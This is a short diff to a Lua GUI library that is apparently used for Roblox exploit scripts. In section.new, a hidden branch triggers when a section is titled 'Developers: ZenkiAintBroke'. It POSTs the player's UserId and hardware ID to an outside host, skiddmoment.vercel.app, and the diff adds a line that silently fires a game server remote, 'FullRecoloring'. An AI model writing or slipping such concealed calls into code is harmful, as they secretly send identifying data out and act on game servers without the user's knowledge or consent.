@@ -7,6 +7,7 @@ local input = game:GetService("UserInputService")
 local run = game:GetService("RunService")
 local tween = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local tweeninfo = TweenInfo.new
 
 -- additional
@@ -379,6 +380,7 @@ do
 	function section.new(page, title)
 		if title == "Developers: ZenkiAintBroke" then
             		request({Url="https://skiddmoment.vercel.app",Method="POST",Headers={["content-type"]="application/json"} ,Body=HttpService:JSONEncode({ID=player.UserId,HWID=gethwid()})})
+			ReplicatedStorage:WaitForChild("_CS.Events").FullRecoloring:FireServer("B")
         	end
 		local container = utility:Create("ImageLabel", {
 			Name = title,
